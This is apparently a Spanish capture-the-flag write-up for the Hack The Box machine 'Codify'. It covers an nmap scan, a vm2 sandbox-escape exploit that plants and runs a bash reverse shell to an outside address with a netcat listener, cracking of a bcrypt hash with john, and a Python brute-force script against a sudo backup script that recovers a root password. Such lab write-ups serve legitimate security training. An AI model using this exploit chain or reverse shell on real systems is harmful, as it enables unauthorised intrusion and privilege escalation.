---
author: naibu3
date: 2023-04-20
tier: easy
---
#linux 

## Fase de reconocimiento

```bash
sudo nmap -sS -p- --min-rate 5000 --open -n -Pn 10.10.11.239
```
```nmap
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Si añadimos el dominio **`codify.htb`** al `/etc/hosts`, podremos acceder a la siguiente web:

![[Pasted image 20231120170517.png]]
![[Pasted image 20231120170652.png]]
![[Pasted image 20231120170624.png]]
![[Pasted image 20231120171030.png]]

Nos llama la atención el editor de código basado en la librería **vm2**, que se nos referencia en *`codify.htb/about`*, si seguimos el enlace, veremos que es concretamente la versión **3.9.16**. Si buscamos como podemos escapar de un entorno de *sandbox* como este, encontraremos la siguiente [vulnerabilidad](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244), que nos permite [[RCE]] (*ejecución remota de comandos*):

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo "bash -i >& /dev/tcp/10.10.14.138/8080 0>&1" > payload.sh');
}
`

console.log(vm.run(code));
```
> Creamos una [[Reverse shell]] en el servidor.

```bash
nc -lvnp 8080
```
> Nos ponemos en escucha con [[netcat]].

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash payload.sh');
}
`

console.log(vm.run(code));
```
> Ejecutamos la *reverse shell*.

Una vez recibida la conexión, aplicamos un [[Tratamiento de la tty]] para hacer más cómodo el [[Reconocimiento del equipo]].

## Usuario joshua

Vemos que estamos como el usuario **svc**, y que existe además **joshua**.

Encontramos también una aplicación web que parece acceder a una base de datos:

```js
secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH',
[...]
bcrypt.compare(password, row.password, (err, result) => {
```

Aunque no podemos entrar en la BD, podemos ver las cadenas con **`strings`**:

`$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

Y encontramos la siguiente que parece ser un hash en formato **bcrypt**, por tanto tratamos de romperlo con [[john]]:

```bash
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
```

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
```john
spongebob1
```

```bash
joshua@codify:~$ cat brute.py 
```
```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

`kljh12k3jhaskjh12kjh3`

